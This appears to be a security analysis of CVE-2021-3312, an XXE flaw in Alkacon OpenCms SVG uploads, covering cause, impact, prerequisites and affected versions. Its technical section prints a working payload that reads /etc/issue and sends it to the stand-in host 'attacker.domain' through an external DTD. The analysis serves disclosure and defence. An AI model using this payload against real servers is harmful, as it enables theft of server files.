Based on the provided content, here's an analysis of CVE-2021-3312:

**Root cause of vulnerability:**
The vulnerability is due to an XML External Entity (XXE) injection flaw in the way Alkacon OpenCms processes SVG files.

**Weaknesses/vulnerabilities present:**
- **XXE Injection:** The software is vulnerable to XML External Entity (XXE) injection. This occurs because the software parses XML content (specifically SVG files in this case) without properly sanitizing or disabling external entity resolution.

**Impact of exploitation:**
- **File Exfiltration:** An attacker can exploit this vulnerability to read arbitrary files from the server's file system. The content of these files can then be sent to an external server controlled by the attacker.
- **Confidentiality Impact:** Successful exploitation can lead to the disclosure of sensitive information stored on the server, such as configuration files, application code, or other data.

**Attack vectors:**
- **Network:** The attack vector is network-based, meaning an attacker can exploit it remotely over a network.
- **File Upload:** The attack is carried out by uploading a specially crafted SVG file to the OpenCms server.
- **External Server:** The attack requires an external server controlled by the attacker to host a malicious XML file.

**Required attacker capabilities/position:**
- **Authentication:** The attacker needs to be an authenticated user with edit privileges within the OpenCms system.
- **Edit Permissions:** The attacker must have the ability to upload files, specifically SVG files, to the server.
- **External Server Setup:** The attacker must have an accessible external server to host the malicious `evil.xml` file.

**Technical Details:**
The attacker uploads an SVG file containing a malicious DOCTYPE definition, like:
```xml
<!DOCTYPE svg [
  <!ELEMENT svg ANY >
  <!ENTITY % sp SYSTEM "http://attacker.domain/evil.xml">
  %sp;
]>
<svg viewBox="0 0 200 200" version="1.2" xlmns="http://www.w3.org/2000/svg" style="fill:red">
    <text x="15" y="100" style="fill:black">&exfil;</text>
</svg>
```
The `evil.xml` file, hosted on the attacker's server, defines further entities to read local files and send them back to the attackerâ€™s server:
```xml
<!ENTITY % file SYSTEM "file:///etc/issue">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.domain/?%file;'>">
%eval;
%exfil;
```
This setup allows the attacker to read files from the server, such as `/etc/issue`, and transmit the content to the attacker controlled server `attacker.domain`.

**Affected Versions:**
- Alkacon OpenCms versions 11.0, 11.0.1, and 11.0.2 are vulnerable.
- The vulnerability is fixed in version 12.0.0
